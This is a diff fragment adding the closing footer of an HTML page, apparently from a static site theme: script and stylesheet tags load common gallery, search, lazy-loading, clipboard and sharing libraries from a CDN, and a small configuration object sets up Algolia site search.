+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.13.1/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"lightgallery":true,"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.en","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
